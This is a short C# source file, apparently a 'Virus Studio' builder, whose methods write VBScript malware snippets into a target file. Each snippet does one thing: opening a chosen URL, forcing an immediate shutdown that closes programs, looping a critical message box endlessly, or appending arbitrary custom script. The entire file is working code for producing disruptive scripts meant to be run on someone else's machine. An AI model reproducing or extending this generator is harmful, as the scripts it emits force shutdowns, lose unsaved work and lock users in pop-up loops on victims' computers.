using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace Virus_Studio
{
    class Virus
    {
        string virusName = String.Empty;

        void openWebsite(string URL, string filePath)
        {
            string urlScript = "\n" + "Dim wShell" + "\n" + "Set wShell = CreateObject(\"WScript.Shell\")" + "\n" + "wShell.Run \"" + URL + "\"" + ",9";
            File.AppendAllText(filePath, urlScript);
        }

        void alert(string Message, string filePath)
        {
            string script = "\n" + "msgbox(\" " + Message + "\")";
            File.AppendAllText(filePath, script);
        }

        void shutdown(string filePath)
        {
            string script = "\n" + "\' -s = shutdown, -t 0 = no timeout, -f = force programs to close" + "\n" + "strShutdown = \"shutdown.exe -s -t 0 -f -m \\\" & strComputer" + "\n" + "set objShell = CreateObject(\"WScript.Shell\")" + "\n" + "objShell.Run strShutdown, 0, false" + "\n";
            File.AppendAllText(filePath, script);
        }

        void showVirusName(string filePath)
        {
            string script = "\n" + "msgbox(\"" + virusName + "\")";
            File.AppendAllText(filePath, script);
        }

        void customScript(string filePath, string script)
        {
            File.AppendAllText(filePath, script);
        }

        void spamMessage(string filePath, string Message)
        {
            string script = "\n" + "do" + "\n" + "x=MsgBox(\"" + Message + "\"," + "vbOkOnly+vbCritical," + "\"" + Message + "\"" + ")" + "\n" + "loop";
            File.AppendAllText(filePath, script);
        }
    }
}